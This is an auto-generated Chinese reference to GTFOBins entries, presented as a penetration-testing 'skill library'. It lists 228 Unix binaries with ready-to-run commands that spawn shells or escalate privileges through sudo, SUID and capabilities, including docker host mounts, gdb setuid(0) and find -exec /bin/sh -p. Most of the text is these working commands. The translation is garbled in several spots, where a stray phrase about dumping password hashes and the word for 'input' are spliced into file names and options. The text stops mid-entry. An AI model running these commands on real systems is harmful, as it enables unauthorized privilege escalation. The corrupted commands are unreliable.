# GTFOBins Skill Reference

> 自动生成于 2026-06-26 | 来源: https://gtfobins.org
> 包含 **458** 个可执行文件条目

## 概述

GTFOBins 是一份精心策划的 Unix/Linux 可执行文件列表，这些文件可用于在配置不当的系统中绕过本地安全限制。
本文档可作为渗透测试和漏洞挖掘时的参考技能库。

### 功能分类说明

- **Shell** (shell): 该可执行文件可以生成交互式系统 Shell。
  - MITRE ATT&CK: `T1059`
- **Command** (command): 该可执行文件可以运行非交互式系统命令。
  - MITRE ATT&CK: `T1059`
- **Reverse shell** (reverse-shell): 该可执行文件可以向监听中的攻击者发送反向 Shell。
  - MITRE ATT&CK: `T1059`, `T1071`
- **Bind shell** (bind-shell): 该可执行文件可以将系统 Shell 绑定到本地端口，等待攻击者连接。
  - MITRE ATT&CK: `T1059`, `T1071`
- **File write** (file-write): 该可执行文件可以向本地文件写入数据。
  - MITRE ATT&CK: `T1565`
- **File read** (file-read): 该可执行文件可以从本地文件读取数据。
  - MITRE ATT&CK: `T1005`
- **Upload** (upload): 该可执行文件可以上传本地数据。
  - MITRE ATT&CK: `T1041`
- **Download** (download): 该可执行文件可以下载远程数据。
  - MITRE ATT&CK: `T1105`
- **Library load** (library-load): 该可执行文件可以加载共享库，这些库可用于在同一执行上下文中运行任意代码。
  - MITRE ATT&CK: `T1574`
- **Privilege escalation** (privilege-escalation): 该可执行文件提供了一种权限提升机制，通过间接启用提升的权限，例如设置 SUID 位或修改另一个可执行文件的所有权。
  - MITRE ATT&CK: `T1548`
- **Inherit** (inherit): 该可执行文件可以从另一个可执行文件继承功能。

### 权限上下文说明

- **Unprivileged** (unprivileged): 任何非特权用户都可以执行此功能。
- **Sudo** (sudo): 如果通过 `sudo` 执行，此功能由特权用户执行，因为获取的权限不会被丢弃。
- **SUID** (suid): 如果可执行文件设置了 SUID 位且拥有正确的所有权，此功能由特权用户执行，因为*有效*权限不会被丢弃。
- **Capabilities** (capabilities): 如果可执行文件设置了某些 capabilities，此功能将绕过通常的内核权限检查执行。

---

## 目录

- [Shell (shell)](#shell) — 228 个工具
- [Command (command)](#command) — 30 个工具
- [Reverse shell (reverse-shell)](#reverse-shell) — 21 个工具
- [Bind shell (bind-shell)](#bind-shell) — 7 个工具
- [File read (file-read)](#file-read) — 199 个工具
- [File write (file-write)](#file-write) — 84 个工具
- [Upload (upload)](#upload) — 34 个工具
- [Download (download)](#download) — 32 个工具
- [Library load (library-load)](#library-load) — 11 个工具
- [Privilege escalation (privilege-escalation)](#privilege-escalation) — 14 个工具
- [Inherit (inherit)](#inherit) — 71 个工具

---

## Shell (shell)

> 该可执行文件可以生成交互式系统 Shell。

共 **228** 个工具支持此功能。

| # | 工具名 | 示例数 | 权限上下文 |
|---|--------|--------|-----------|
| 1 | `R` | 1 | sudo, suid, unprivileged |
| 2 | `aa-exec` | 1 | sudo, suid, unprivileged |
| 3 | `agetty` | 1 | suid |
| 4 | `ansible-playbook` | 1 | sudo, unprivileged |
| 5 | `ansible-test` | 1 | sudo, unprivileged |
| 6 | `aoss` | 1 | sudo, unprivileged |
| 7 | `apt-get` | 2 | sudo, suid |
| 8 | `arch-nspawn` | 1 | sudo |
| 9 | `ash` | 1 | sudo, suid, unprivileged |
| 10 | `asterisk` | 1 | sudo, suid, unprivileged |
| 11 | `at` | 1 | sudo, unprivileged |
| 12 | `autoconf` | 1 | sudo, unprivileged |
| 13 | `autoheader` | 1 | sudo, unprivileged |
| 14 | `autoreconf` | 1 | sudo, unprivileged |
| 15 | `bash` | 1 | sudo, suid, unprivileged |
| 16 | `bconsole` | 1 | sudo, unprivileged |
| 17 | `borg` | 1 | sudo, unprivileged |
| 18 | `bpftrace` | 3 | sudo |
| 19 | `bundle` | 3 | sudo, unprivileged |
| 20 | `busctl` | 2 | sudo, suid, unprivileged |
| 21 | `cabal` | 1 | sudo, suid, unprivileged |
| 22 | `capsh` | 1 | sudo, suid, unprivileged |
| 23 | `cdist` | 1 | sudo, unprivileged |
| 24 | `certbot` | 1 | sudo, unprivileged |
| 25 | `check_by_ssh` | 1 | sudo, unprivileged |
| 26 | `check_ssl_cert` | 1 | sudo, unprivileged |
| 27 | `choom` | 1 | sudo, suid, unprivileged |
| 28 | `chroot` | 1 | sudo, suid |
| 29 | `chrt` | 1 | sudo, suid, unprivileged |
| 30 | `clisp` | 1 | sudo, suid, unprivileged |
| 31 | `cmake` | 1 | sudo, unprivileged |
| 32 | `cobc` | 1 | sudo, suid, unprivileged |
| 33 | `codex` | 1 | sudo, unprivileged |
| 34 | `composer` | 1 | sudo, unprivileged |
| 35 | `cpio` | 1 | sudo |
| 36 | `cpulimit` | 1 | sudo, suid, unprivileged |
| 37 | `csh` | 1 | sudo, suid, unprivileged |
| 38 | `csvtool` | 1 | sudo, suid, unprivileged |
| 39 | `ctr` | 1 | sudo, suid |
| 40 | `dash` | 1 | sudo, suid, unprivileged |
| 41 | `dc` | 1 | sudo, suid, unprivileged |
| 42 | `debugfs` | 1 | sudo, suid, unprivileged |
| 43 | `dhclient` | 1 | sudo, unprivileged |
| 44 | `distcc` | 1 | sudo, suid, unprivileged |
| 45 | `dmsetup` | 1 | sudo, suid, unprivileged |
| 46 | `doas` | 1 | sudo, unprivileged |
| 47 | `docker` | 2 | sudo, suid, unprivileged |
| 48 | `dotnet` | 1 | sudo, unprivileged |
| 49 | `dpkg` | 1 | sudo |
| 50 | `dvips` | 1 | sudo, suid, unprivileged |
| 51 | `easyrsa` | 1 | sudo, suid, unprivileged |
| 52 | `ed` | 1 | sudo, suid, unprivileged |
| 53 | `elvish` | 1 | sudo, suid, unprivileged |
| 54 | `emacs` | 1 | sudo, unprivileged |
| 55 | `enscript` | 1 | sudo, suid, unprivileged |
| 56 | `env` | 1 | sudo, suid, unprivileged |
| 57 | `ex` | 1 | sudo, suid, unprivileged |
| 58 | `expect` | 1 | sudo, suid, unprivileged |
| 59 | `fastfetch` | 1 | sudo, suid, unprivileged |
| 60 | `find` | 1 | sudo, suid, unprivileged |
| 61 | `firejail` | 1 | sudo, unprivileged |
| 62 | `fish` | 1 | sudo, suid, unprivileged |
| 63 | `flock` | 1 | sudo, suid, unprivileged |
| 64 | `forge` | 1 | sudo, suid, unprivileged |
| 65 | `ftp` | 1 | sudo, suid, unprivileged |
| 66 | `fzf` | 1 | sudo, suid, unprivileged |
| 67 | `gawk` | 1 | sudo, suid, unprivileged |
| 68 | `gcc` | 1 | sudo, unprivileged |
| 69 | `gdb` | 1 | capabilities, sudo, suid, unprivileged |
| 70 | `gem` | 1 | sudo, unprivileged |
| 71 | `genie` | 1 | sudo, suid, unprivileged |
| 72 | `ghc` | 1 | sudo, unprivileged |
| 73 | `ghci` | 1 | sudo, unprivileged |
| 74 | `ginsh` | 1 | sudo, suid, unprivileged |
| 75 | `git` | 3 | sudo, suid, unprivileged |
| 76 | `gnuplot` | 1 | sudo, suid, unprivileged |
| 77 | `go` | 1 | sudo, unprivileged |
| 78 | `grc` | 1 | sudo, unprivileged |
| 79 | `gtester` | 1 | sudo, suid, unprivileged |
| 80 | `guile` | 1 | sudo, suid, unprivileged |
| 81 | `hg` | 1 | sudo, suid, unprivileged |
| 82 | `hping3` | 1 | sudo, suid, unprivileged |
| 83 | `iftop` | 1 | sudo, suid, unprivileged |
| 84 | `ionice` | 1 | sudo, suid, unprivileged |
| 85 | `ip` | 2 | sudo, suid |
| 86 | `ispell` | 1 | sudo, suid, unprivileged |
| 87 | `java` | 1 | sudo, unprivileged |
| 88 | `jjs` | 1 | sudo, unprivileged |
| 89 | `joe` | 1 | sudo, suid, unprivileged |
| 90 | `jrunscript` | 1 | sudo, suid, unprivileged |
| 91 | `jshell` | 1 | sudo, unprivileged |
| 92 | `jtag` | 1 | sudo, unprivileged |
| 93 | `julia` | 1 | sudo, suid, unprivileged |
| 94 | `ksu` | 1 | sudo |
| 95 | `kubectl` | 1 | sudo, unprivileged |
| 96 | `latex` | 1 | sudo, suid, unprivileged |
| 97 | `latexmk` | 1 | sudo, unprivileged |
| 98 | `ld.so` | 1 | sudo, suid, unprivileged |
| 99 | `less` | 3 | sudo, suid, unprivileged |
| 100 | `lftp` | 1 | sudo, suid, unprivileged |
| 101 | `loginctl` | 1 | sudo, unprivileged |
| 102 | `logrotate` | 1 | sudo |
| 103 | `logsave` | 1 | sudo, suid, unprivileged |
| 104 | `ltrace` | 1 | sudo, unprivileged |
| 105 | `lua` | 1 | sudo, suid, unprivileged |
| 106 | `lxd` | 2 | sudo, suid |
| 107 | `m4` | 1 | sudo, suid, unprivileged |
| 108 | `mail` | 2 | sudo, suid, unprivileged |
| 109 | `make` | 1 | sudo, suid, unprivileged |
| 110 | `man` | 1 | sudo, suid, unprivileged |
| 111 | `mawk` | 1 | sudo, suid, unprivileged |
| 112 | `minicom` | 2 | sudo, suid, unprivileged |
| 113 | `more` | 1 | sudo, suid, unprivileged |
| 114 | `mosh-server` | 1 | sudo |
| 115 | `msgfilter` | 1 | sudo, suid, unprivileged |
| 116 | `multitime` | 1 | sudo, suid, unprivileged |
| 117 | `mysql` | 1 | sudo, suid, unprivileged |
| 118 | `nano` | 2 | sudo, suid, unprivileged |
| 119 | `ncdu` | 1 | sudo, suid, unprivileged |
| 120 | `ncftp` | 1 | sudo, suid, unprivileged |
| 121 | `neofetch` | 1 | sudo, unprivileged |
| 122 | `nice` | 1 | sudo, suid, unprivileged |
| 123 | `nmap` | 1 | sudo, suid, unprivileged |
| 124 | `node` | 1 | capabilities, sudo, suid, unprivileged |
| 125 | `nohup` | 1 | sudo, suid, unprivileged |
| 126 | `npm` | 3 | sudo, unprivileged |
| 127 | `nroff` | 1 | sudo, unprivileged |
| 128 | `nsenter` | 1 | sudo, suid, unprivileged |
| 129 | `octave` | 1 | sudo, suid, unprivileged |
| 130 | `openvpn` | 1 | sudo, suid, unprivileged |
| 131 | `opkg` | 1 | sudo |
| 132 | `pdflatex` | 1 | sudo, suid, unprivileged |
| 133 | `pdftex` | 1 | sudo, suid, unprivileged |
| 134 | `perf` | 1 | sudo, suid, unprivileged |
| 135 | `perl` | 2 | capabilities, sudo, unprivileged |
| 136 | `perlbug` | 1 | sudo, unprivileged |
| 137 | `pexec` | 1 | sudo, suid, unprivileged |
| 138 | `pg` | 1 | sudo, suid, unprivileged |
| 139 | `php` | 4 | capabilities, sudo, suid, unprivileged |
| 140 | `pic` | 1 | sudo, suid, unprivileged |
| 141 | `pidstat` | 1 | sudo, suid, unprivileged |
| 142 | `pip` | 1 | sudo, unprivileged |
| 143 | `pkexec` | 1 | sudo |
| 144 | `plymouth` | 1 | sudo, suid, unprivileged |
| 145 | `podman` | 1 | sudo, unprivileged |
| 146 | `posh` | 1 | sudo, unprivileged |
| 147 | `psftp` | 1 | sudo, suid, unprivileged |
| 148 | `psql` | 1 | sudo, suid, unprivileged |
| 149 | `puppet` | 1 | sudo, unprivileged |
| 150 | `pwsh` | 1 | sudo, unprivileged |
| 151 | `python` | 1 | capabilities, sudo, suid, unprivileged |
| 152 | `ranger` | 1 | sudo, unprivileged |
| 153 | `rc` | 1 | sudo, suid, unprivileged |
| 154 | `restic` | 2 | sudo, suid, unprivileged |
| 155 | `rlwrap` | 1 | sudo, suid, unprivileged |
| 156 | `rpm` | 2 | sudo, suid, unprivileged |
| 157 | `rpmdb` | 1 | sudo, suid, unprivileged |
| 158 | `rpmquery` | 1 | sudo, suid, unprivileged |
| 159 | `rpmverify` | 1 | sudo, suid, unprivileged |
| 160 | `rsync` | 1 | sudo, suid, unprivileged |
| 161 | `rtorrent` | 1 | sudo, suid, unprivileged |
| 162 | `ruby` | 1 | capabilities, sudo, unprivileged |
| 163 | `run-parts` | 2 | sudo, suid, unprivileged |
| 164 | `runscript` | 1 | sudo, suid, unprivileged |
| 165 | `rustup` | 1 | sudo, unprivileged |
| 166 | `sash` | 1 | sudo, suid, unprivileged |
| 167 | `scanmem` | 1 | sudo, suid, unprivileged |
| 168 | `scp` | 2 | sudo, suid, unprivileged |
| 169 | `screen` | 1 | sudo, unprivileged |
| 170 | `script` | 1 | sudo, suid, unprivileged |
| 171 | `scrot` | 1 | sudo, suid, unprivileged |
| 172 | `sed` | 2 | sudo, suid, unprivileged |
| 173 | `service` | 1 | sudo, unprivileged |
| 174 | `setarch` | 1 | sudo, suid, unprivileged |
| 175 | `setlock` | 1 | sudo, suid, unprivileged |
| 176 | `sftp` | 1 | sudo, suid, unprivileged |
| 177 | `sg` | 1 | sudo, unprivileged |
| 178 | `slsh` | 1 | sudo, suid, unprivileged |
| 179 | `smbclient` | 1 | sudo, unprivileged |
| 180 | `socat` | 1 | sudo, suid, unprivileged |
| 181 | `softlimit` | 1 | sudo, suid, unprivileged |
| 182 | `split` | 1 | sudo, suid, unprivileged |
| 183 | `sqlite3` | 1 | sudo, suid, unprivileged |
| 184 | `ssh` | 3 | sudo, suid, unprivileged |
| 185 | `ssh-agent` | 1 | sudo, suid, unprivileged |
| 186 | `sshfs` | 1 | sudo, unprivileged |
| 187 | `sshpass` | 1 | sudo, suid, unprivileged |
| 188 | `sshuttle` | 1 | sudo |
| 189 | `start-stop-daemon` | 1 | sudo, suid, unprivileged |
| 190 | `stdbuf` | 1 | sudo, suid, unprivileged |
| 191 | `strace` | 1 | sudo, suid, unprivileged |
| 192 | `su` | 1 | sudo |
| 193 | `sudo` | 1 | sudo |
| 194 | `systemctl` | 2 | sudo, suid |
| 195 | `systemd-run` | 2 | sudo |
| 196 | `tar` | 3 | sudo, suid, unprivileged |
| 197 | `task` | 1 | sudo, suid, unprivileged |
| 198 | `taskset` | 1 | sudo, unprivileged |
| 199 | `tasksh` | 1 | sudo, suid, unprivileged |
| 200 | `tclsh` | 1 | sudo, suid, unprivileged |
| 201 | `tcsh` | 1 | sudo, suid, unprivileged |
| 202 | `tdbtool` | 1 | sudo, suid, unprivileged |
| 203 | `telnet` | 1 | sudo, suid, unprivileged |
| 204 | `tex` | 1 | sudo, suid, unprivileged |
| 205 | `time` | 1 | sudo, suid, unprivileged |
| 206 | `timeout` | 1 | sudo, suid, unprivileged |
| 207 | `tmate` | 1 | sudo, suid, unprivileged |
| 208 | `tmux` | 2 | sudo, suid, unprivileged |
| 209 | `top` | 1 | sudo, unprivileged |
| 210 | `torify` | 1 | sudo, unprivileged |
| 211 | `torsocks` | 1 | sudo, unprivileged |
| 212 | `unshare` | 1 | sudo, suid, unprivileged |
| 213 | `uv` | 1 | sudo, unprivileged |
| 214 | `valgrind` | 1 | sudo, unprivileged |
| 215 | `vi` | 4 | sudo, suid, unprivileged |
| 216 | `watch` | 2 | sudo, suid, unprivileged |
| 217 | `wg-quick` | 1 | sudo |
| 218 | `wget` | 1 | sudo, suid, unprivileged |
| 219 | `xargs` | 3 | sudo, suid, unprivileged |
| 220 | `xdg-user-dir` | 1 | sudo, unprivileged |
| 221 | `xdotool` | 1 | sudo, suid, unprivileged |
| 222 | `yarn` | 3 | sudo, unprivileged |
| 223 | `yash` | 1 | sudo, suid, unprivileged |
| 224 | `yt-dlp` | 1 | sudo, unprivileged |
| 225 | `zathura` | 1 | sudo, unprivileged |
| 226 | `zip` | 1 | sudo, suid, unprivileged |
| 227 | `zsh` | 1 | sudo, suid, unprivileged |
| 228 | `zypper` | 2 | sudo, unprivileged |

### `R`

```bash
R --no-save -e 'system("/bin/sh")'
```

### `aa-exec`

```bash
aa-exec /bin/sh
```

### `agetty`

```bash
agetty -l /bin/sh -o -p -a root tty
```

### `ansible-playbook`

```bash
echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >/path/to/temp-file
ansible-playbook /path/to/temp-file
```

### `ansible-test`

```bash
ansible-test shell
```

### `aoss`

```bash
aoss /bin/sh
```

### `apt-get`

**方法 1:**

> **注意**: 要使此方法生效，目标包 (i.e., `sl`) 必须尚未安装。
```bash
echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' >/path/to/temp-file
apt-get -y install -c /path/to/temp-file sl
```

**方法 2:**

> **注意**: 当 Shell 退出时， `update` 命令实际上会被执行。
```bash
apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

### `arch-nspawn`

```bash
mkdir -p ./etc/
grep -oP "^CHROOT_VERSION='\K[^']+" /usr/share/devtools/lib/archroot.sh >.arch-chroot
touch ./etc/pacman.conf
echo 'CARCH=true;/bin/sh;exit' >etc/makepkg.conf
arch-nspawn .
```

### `ash`

```bash
ash
```
**suid** variant:
```bash
ash -p
```

### `asterisk`

> **注意**: 服务器实例必须已经在运行，否则可以使用 `sudo asterisk -F`. 此外，调用用户必须能够访问套接字。
```bash
asterisk -r
!/bin/sh
```

### `at`

> **注意**: `tail` 用于暂停终端。
```bash
echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
```

### `autoconf`

```bash
echo /bin/sh >/path/to/temp-file
chmod +x /path/to/temp-file
touch configure.ac
AUTOM4TE=/path/to/temp-file autoconf
```

### `autoheader`

```bash
echo '/bin/sh 1>&0' >/path/to/temp-file
chmod +x /path/to/temp-file
touch configure.ac
AUTOM4TE=/path/to/temp-file autoheader
```

### `autoreconf`

> **注意**: Shell 会被多次调用。
```bash
echo '/bin/sh 1>&0' >/path/to/temp-file
chmod +x /path/to/temp-file
echo AC_INIT >configure.ac
AUTOM4TE=/path/to/temp-file autoreconf
```

### `bash`

```bash
bash
```
**suid** variant:
```bash
bash -p
```

### `bconsole`

```bash
bconsole
@exec /bin/sh
```

### `borg`

```bash
borg extract @:/::: --rsh "/bin/sh -c '/bin/sh </dev/tty >/dev/tty 2>/dev/tty'"
```

### `bpftrace`

**方法 1:**

```bash
bpftrace --unsafe -e 'BEGIN {system("/bin/sh 1<&0");exit()}'
```

**方法 2:**

```bash
echo 'BEGIN {system("/bin/sh 1<&0");exit()}' >/path/to/temp-file
bpftrace --unsafe /path/to/temp-file
```

**方法 3:**

```bash
bpftrace -c /bin/sh -e 'END {exit()}'
```

### `bundle`

**方法 1:**

```bash
BUNDLE_GEMFILE=x bundle exec /bin/sh
```

**方法 2:**

```bash
touch Gemfile
bundle exec /bin/sh
```

**方法 3:**

> **注意**: This might run the shell 两次, one after the other.
```bash
echo 'system("/bin/sh")' >Gemfile
bundle install
```

### `busctl`

**方法 1:**

```bash
busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
```
**suid** variant:
```bash
busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

**方法 2:**

```bash
busctl --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
```
**suid** variant:
```bash
busctl --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

### `cabal`

```bash
cabal exec --project-file=/dev/null -- /bin/sh
```
**suid** variant:
```bash
cabal exec --project-file=/dev/null -- /bin/sh -p
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

### `capsh`

```bash
capsh --
```
**suid** variant:
```bash
capsh --gid=0 --uid=0 --
```

### `cdist`

```bash
cdist shell -s /bin/sh
```

### `certbot`

> **注意**: This needs a writable directory, replace `.` 。
```bash
certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir . --work-dir . --config-dir . --pre-hook '/bin/sh 1>&0 2>&0'
```

### `check_by_ssh`

> 这是 `check_by_ssh` Nagios 插件，例如在 `/usr/lib/nagios/plugins/`.

> **注意**: Shell 只会持续 10 秒。
```bash
check_by_ssh -o "ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)" -H localhost -C x
```

### `check_ssl_cert`

> 这是 `check_ssl_cert` Nagios 插件，例如在 `/usr/lib/nagios/plugins/`.

> **注意**: Shell 会被多次调用。
```bash
echo 'exec /bin/sh 0<&2 1>&2' >/path/to/temp-file
chmod +x /path/to/temp-file
check_ssl_cert --grep-bin /path/to/temp-file -H x
```

### `choom`

```bash
choom -n 0 /bin/sh
```
**suid** variant:
```bash
choom -n 0 -- /bin/sh -p
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

### `chroot`

```bash
chroot /
```
**suid** variant:
```bash
chroot / /bin/sh -p
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

### `chrt`

> **注意**: 1 到 99 之间的任何数字都可以。
```bash
chrt 1 /bin/sh
```
**suid** variant:
```bash
chrt 1 /bin/sh -p
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

### `clisp`

```bash
clisp -x '(ext:run-shell-command "/bin/sh")(ext:exit)'
```

### `cmake`

```bash
echo 'execute_process(COMMAND /bin/sh)' >/path/to/CMakeLists.txt
cmake /path/to/
```

### `cobc`

> **注意**: The `/path/to/temp-file` 将在执行后被覆盖。
```bash
echo 'CALL "SYSTEM" USING "/bin/sh".' >/path/to/temp-file
cobc -xFj --frelax-syntax-checks /path/to/temp-file
```

### `codex`

```bash
codex sandbox linux /bin/sh
```

### `composer`

```bash
echo '{"scripts":{"x":"/bin/sh"}}' >composer.json
composer run-script x
```

### `cpio`

```bash
echo '/bin/sh </dev/tty >/dev/tty' >localhost
cpio -o --rsh-command /bin/sh -F localhost:
```

### `cpulimit`

```bash
cpulimit -l 100 -f -- /bin/sh
```
**suid** variant:
```bash
cpulimit -l 100 -f -- /bin/sh -p
```

### `csh`

```bash
csh
```
**suid** variant:
```bash
csh -b
```

### `csvtool`

```bash
csvtool call '/bin/sh;false' /etc/hosts
```

### `ctr`

> **注意**: An image must be already present, for example:

```
ctr images pull docker.io/library/alpine:latest
```
```bash
ctr run --rm --mount 输入=bind,src=/,dst=/,options=rbind -t docker.io/library/alpine:latest x
```

### `dash`

```bash
dash
```

### `dc`

```bash
dc -e '!/bin/sh'
```

### `debugfs`

```bash
debugfs
!/bin/sh
```

### `dhclient`

```bash
dhclient -sf /bin/sh
```

### `distcc`

```bash
distcc /bin/sh
```
**suid** variant:
```bash
distcc /bin/sh -p
```

### `dmsetup`

```bash
dmsetup create base <<EOF
0 3534848 linear /dev/loop0 94208
EOF
dmsetup ls --exec '/bin/sh -s'
```
**suid** variant:
```bash
dmsetup create base <<EOF
0 3534848 linear /dev/loop0 94208
EOF
dmsetup ls --exec '/bin/sh -p -s'
```

### `doas`

> **注意**: 用户必须被允许使用 `doas`.
```bash
doas -u root /bin/sh
```

### `docker`

> 这要求用户具有足够的权限来运行 `docker`, 例如在 `docker` 组中或是 `root`.

**方法 1:**

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
```

**方法 2:**

> **注意**: 这利用了使用 `--privileged` 选项运行的事实，可以直接挂载主机的磁盘，例如 `/dev/sda1`.
```bash
docker run --rm -it --privileged -u root alpine
mount /dev/sda1 /mnt/
ls -la /mnt/
chroot /mnt /bin/bash
```

### `dotnet`

```bash
dotnet fsi
System.Diagnostics.Process.Start("/bin/sh").WaitForExit();;
```

### `dpkg`

> **注意**: 使用 Debian package with [fpm](https://github.com/jordansissel/fpm) 生成并上传到目标。

```
echo 'exec /bin/sh' >x.sh
fpm -n x -s dir -t deb -a all --before-install x.sh .
```
```bash
dpkg -i x_1.0_all.deb
```

### `dvips`

> **注意**: The `texput.dvi` 生成的 `tex` 输出文件可以离线创建并上传到目标。

```
tex '\special{psfile="`/bin/sh 1>&0"}\end'
```
```bash
dvips -R0 texput.dvi
```

### `easyrsa`

> **注意**: 此命令可能不在 `PATH`, 中，可以在 `/usr/share/easy-rsa/easyrsa`. Shell 会被生成两次。
```bash
echo 'set_var X "$(/bin/sh 1>&0)"' >/path/to/temp-file
easyrsa --vars=/path/to/temp-file
```

### `ed`

```bash
ed
!/bin/sh
q
```

### `elvish`

```bash
elvish
```

### `emacs`

> 所有功能都在 Emacs 终端界面中操作。

```bash
emacs -Q -nw --eval '(term "/bin/sh")'
```

### `enscript`

```bash
enscript /dev/null -qo /dev/null -I '/bin/sh >&2'
```

### `env`

```bash
env /bin/sh
```
**suid** variant:
```bash
env /bin/sh -p
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

### `ex`

```bash
ex -c ':!/bin/sh'
```

### `expect`

```bash
expect -c 'spawn /bin/sh;interact'
```
**suid** variant:
```bash
expect -c 'spawn /bin/sh -p;interact'
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

### `fastfetch`

```bash
echo '{"modules":[{"输入":"command","key":"x","text":"exec /bin/sh 1>&0 2>&0"}]}' >/path/to/temp-文件转储密码哈希。jsonc
fastfetch -c /path/to/temp-文件转储密码哈希。jsonc
```

### `find`

```bash
find . -exec /bin/sh \; -quit
```
**suid** variant:
```bash
find . -exec /bin/sh -p \; -quit
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

### `firejail`

```bash
firejail /bin/sh
```

### `fish`

```bash
fish
```

### `flock`

```bash
flock -u / /bin/sh
```
**suid** variant:
```bash
flock -u / /bin/sh -p
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

### `forge`

```bash
echo '#!/bin/sh' >/path/to/temp-file
echo -e "/bin/sh <$(tty) >$(tty) 2>$(tty)" >>/path/to/temp-file
chmod +x /path/to/temp-file
forge build --use /path/to/temp-file
```

### `ftp`

```bash
ftp
!/bin/sh
```

### `fzf`

> **注意**: 按 `Enter` 接收 Shell。
```bash
fzf --bind 'enter:execute(/bin/sh)'
```

### `gawk`

```bash
gawk 'BEGIN {system("/bin/sh")}'
```

### `gcc`

> **注意**: 在某些旧版本中， `x` argument must instead reference any existing 文件转储密码哈希。
```bash
gcc -wrapper /bin/sh,-s x
```

### `gdb`

```bash
gdb -nx -ex '!/bin/sh' -ex quit
```
**capabilities** variant:
```bash
gdb -nx -ex 'python import os; os.setuid(0)' -ex '!/bin/sh' -ex quit
```

### `gem`

> **注意**: 这要求提供已安装 gem 的名称，例如 `debug` 通常已安装。
```bash
gem open -e '/bin/sh -s' debug
```

### `genie`

```bash
genie -c '/bin/sh'
```

### `ghc`

```bash
ghc -e 'System.Process.callCommand "/bin/sh"'
```

### `ghci`

```bash
ghci
System.Process.callCommand "/bin/sh"
```

### `ginsh`

```bash
ginsh
!/bin/sh
```

### `git`

**方法 1:**

```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
```

**方法 2:**

> **注意**: Git hooks are merely shell scripts and in the following example the hook associated to the `pre-commit` action ）。 Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used, and moving into the directory works too.
```bash
git init .
echo 'exec /bin/sh 0<&2 1>&2' >.git/hooks/pre-commit
chmod +x .git/hooks/pre-commit
git -C . commit --allow-empty -m x
```

**方法 3:**

```bash
ln -s /bin/sh git-x
git --exec-path=. x
```
**suid** variant:
```bash
ln -s /bin/sh git-x
git --exec-path=. x -p
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

### `gnuplot`

```bash
gnuplot -e 'system("/bin/sh 1>&0")'
```

### `go`

```bash
echo -e 'package main\nimport "syscall"\nfunc main(){\n\tsyscall.Exec("/bin/sh", []string{"/bin/sh", "-i"}, []string{})\n}' >/path/to/temp-文件转储密码哈希。go
go run /path/to/temp-文件转储密码哈希。go
```

### `grc`

```bash
grc --pty /bin/sh
```

### `gtester`

```bash
echo 'exec /bin/sh 0<&1' >/path/to/temp-file
chmod +x /path/to/temp-file
gtester -q /path/to/temp-file
```
**suid** variant:
```bash
echo '#!/bin/sh -p' >/path/to/temp-file
echo 'exec /bin/sh -p 0<&1' >>/path/to/temp-file
chmod +x /path/to/temp-file
gtester -q /path/to/temp-file
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

### `guile`

```bash
guile -c '(system "/bin/sh")'
```

### `hg`

```bash
hg --config alias.x='!/bin/sh' x
```

### `hping3`

```bash
hping3
/bin/sh
```
**suid** variant:
```bash
hping3
/bin/sh -p
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

### `iftop`

> **注意**: 这需要捕获某些设备的权限（如有需要请使用 `-i` 指定）。
```bash
iftop
!/bin/sh
```

### `ionice`

```bash
ionice /bin/sh
```
**suid** variant:
```bash
ionice /bin/sh -p
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

### `ip`

**方法 1:**

```bash
ip netns add foo
ip netns exec foo /bin/sh
ip netns delete foo
```
**suid** variant:
```bash
ip netns add foo
ip netns exec foo /bin/sh -p
ip netns delete foo
```

**方法 2:**

```bash
ip netns add foo
ip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar
ip netns exec bar /bin/sh
ip netns delete foo
ip netns delete bar
```

### `ispell`

```bash
ispell /etc/hosts
!/bin/sh
```
**suid** variant:
```bash
ispell /etc/hosts
!/bin/sh -p
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

### `java`

> **注意**: The `Shell.class` class file can be compiled offline, 然后 uploaded to the target:

```
cat >Shell.java <<EOF
public class Shell {
    public static void main(String[] args) throws Exception {
        new ProcessBuilder("/bin/sh").inheritIO().start().waitFor();
    }
}
EOF

javac Shell.java
```
```bash
java Shell
```

### `jjs`

> 此工具从 Java SE 8 开始安装。

```bash
jjs
Java.输入('java.lang.Runtime').getRuntime().exec('/bin/sh -c $@|sh _ echo sh </dev/tty >/dev/tty 2>/dev/tty').waitFor()
```

### `joe`

> **注意**: 终端在终端界面中生成。
```bash
joe
^K!/bin/sh
```

### `jrunscript`

> 此工具从 Java SE 6 开始安装。

```bash
